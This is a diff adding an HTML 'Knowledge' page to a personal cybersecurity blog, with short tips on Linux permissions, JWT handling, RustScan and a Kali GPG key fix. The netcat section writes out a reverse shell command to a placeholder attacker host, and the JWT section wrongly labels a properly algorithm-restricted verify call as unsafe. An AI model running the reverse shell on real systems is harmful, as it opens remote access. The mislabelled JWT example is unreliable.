@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Knowledge | Sandaru Dinusha</title>
+  <link rel="stylesheet" href="css/knowledge.css" />
+</head>
+<body>
+  <header>
+    <div class="container nav-container" style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap;">
+      <h1>Sandaru Dinusha | Knowledge Hub</h1>
+      <div id="menu-toggle">&#9776;</div>
+      <nav id="nav">
+        <a href="./index.html">Home</a>
+        <a href="./projects.html">Projects</a>
+        <a href="./knowledge.html" class="active">Knowledge</a>
+        <a href="./attacks.html">Attacks</a>
+        <a href="./contact_me.html">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container">
+    <h2>📘 Latest Cybersecurity Knowledge</h2>
+    <p>This page is dedicated to sharing what I learn regularly: fixes, discoveries, and tricks that help cybersecurity students and professionals grow.</p>
+
+    <section class="knowledge-section">
+      <div class="card" data-modal="modal1">
+        <h3>🔧 Fixing “Permission Denied” in Linux</h3>
+        <p>If you're getting <code>Permission denied</code>, try: <code>chmod +x filename.sh</code> or <code>sudo</code>.</p>
+      </div>
+
+      <div class="card" data-modal="modal2">
+        <h3>🧠 Understanding JWT Attacks</h3>
+        <p>JWT can be vulnerable if not signed securely. Avoid "none" algorithm, use strong secrets, validate tokens.</p>
+      </div>
+
+      <div class="card" data-modal="modal3">
+        <h3>📌 Netcat Reverse Shell Basics</h3>
+        <p>Victim Command: <code>nc -e /bin/bash attackerip 4444</code> Attacker listens with <code>nc -lvnp 4444</code>.</p>
+      </div>
+
+      <div class="card" data-modal="modal4">
+        <h3>💡 Tip: Find Open Ports Fast with RustScan</h3>
+        <p>RustScan is a modern alternative to nmap. Use: <code>rustscan -a 192.168.1.1 --ulimit 5000</code>.</p>
+      </div>
+
+      <!-- NEW REPORT CARD -->
+      <div class="card" data-modal="modal5">
+        <h3>🔑 Missing GPG Key in Kali Linux APT Repo</h3>
+        <p>Error resolving missing key during Kali Linux apt update and how to fix it.</p>
+      </div>
+    </section>
+  </main>
+
+  <!-- Modals -->
+  <div class="modal" id="modal1">
+    <div class="modal-content">
+      <span class="close" data-close="modal1">&times;</span>
+      <h2>🔧 Fixing “Permission Denied” in Linux</h2>
+      <p>
+        When you get a "Permission Denied" error, try:
+      </p>
+      <ul>
+        <li>Make the script executable: <code>chmod +x filename.sh</code></li>
+        <li>Run command as root: <code>sudo ./filename.sh</code></li>
+        <li>Check file permissions with <code>ls -l</code></li>
+      </ul>
+      <p>Always be careful when running commands with elevated privileges.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="modal2">
+    <div class="modal-content">
+      <span class="close" data-close="modal2">&times;</span>
+      <h2>🧠 Understanding JWT Attacks</h2>
+      <p>JSON Web Tokens can be exploited if not handled correctly. Some tips:</p>
+      <ul>
+        <li>Do not accept JWTs with "none" algorithm.</li>
+        <li>Use strong secret keys.</li>
+        <li>Validate tokens strictly on the server.</li>
+        <li>Implement token expiration and refresh.</li>
+      </ul>
+      <p>Example unsafe code:</p>
+      <pre><code>jwt.verify(token, 'secret', { algorithms: ['HS256'] }, callback)</code></pre>
+    </div>
+  </div>
+
+  <div class="modal" id="modal3">
+    <div class="modal-content">
+      <span class="close" data-close="modal3">&times;</span>
+      <h2>📌 Netcat Reverse Shell Basics</h2>
+      <p>Commands:</p>
+      <ul>
+        <li>Victim: <code>nc -e /bin/bash attackerip 4444</code></li>
+        <li>Attacker: <code>nc -lvnp 4444</code></li>
+      </ul>
+      <p>Use responsibly in lab environments only.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="modal4">
+    <div class="modal-content">
+      <span class="close" data-close="modal4">&times;</span>
+      <h2>💡 Tip: Find Open Ports Fast with RustScan</h2>
+      <p>
+        RustScan is faster than Nmap for port scanning.
+      </p>
+      <p>
+        Run: <code>rustscan -a 192.168.1.1 --ulimit 5000</code>
+      </p>
+    </div>
+  </div>
+
+  <!-- NEW REPORT MODAL -->
+  <div class="modal" id="modal5">
+    <div class="modal-content">
+      <span class="close" data-close="modal5">&times;</span>
+      <h2>🔑 Missing GPG Key in Kali Linux APT Repository</h2>
+
+      <h3>Issue Summary</h3>
+      <ul>
+        <li>While running <code>apt update</code> on Kali Linux, an error occurs:</li>
+        <li>Missing key <code>827C8569F2518CC677FECA1AED65462EC8D5E4C5</code>, needed to verify signature.</li>
+        <li>Repository <code>http://http.kali.org/kali kali-rolling In Release</code> is not signed.</li>
+      </ul>
+
+      <h3>What is a GPG Key in APT Repositories?</h3>
+      <p>
+        APT uses GPG (GNU Privacy Guard) keys to verify package authenticity and integrity.
+        Repositories are signed with private keys; your system needs the matching public key to:
+      </p>
+      <ul>
+        <li>Authenticate packages as trusted from Kali Linux.</li>
+        <li>Prevent man-in-the-middle or tampered packages.</li>
+      </ul>
+
+      <h3>Cause of the Error</h3>
+      <ul>
+        <li>Kali Linux rotated its signing key for kali-rolling repository.</li>
+        <li>Your system didn’t have the new key, so APT cannot verify it.</li>
+      </ul>
+
+      <h3>Resolution</h3>
+      <p>Fix by fetching and adding the missing GPG key manually:</p>
+      <pre><code>curl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg -dearmor -o /etc/apt/trusted.gpg.d/kali-archive.gpg</code></pre>
+      <ul>
+        <li>Downloads Kali's public archive key.</li>
+        <li>Converts it to .gpg format.</li>
+        <li>Stores it securely in trusted keys directory.</li>
+      </ul>
+
+      <h3>Security Implications</h3>
+      <ul>
+        <li>Ensures only packages signed by Kali’s private key are installed.</li>
+        <li>Detects and blocks altered or spoofed packages.</li>
+        <li>Core part of Linux package security.</li>
+      </ul>
+    </div>
+  </div>
+
+  <footer>
+    <div class="container">
+      <p>&copy; 2025 Sandaru Dinusha | Sharing Knowledge 🔐</p>
+    </div>
+  </footer>
+
+  <script src="js/knowledge.js"></script>
+</body>
+</html>
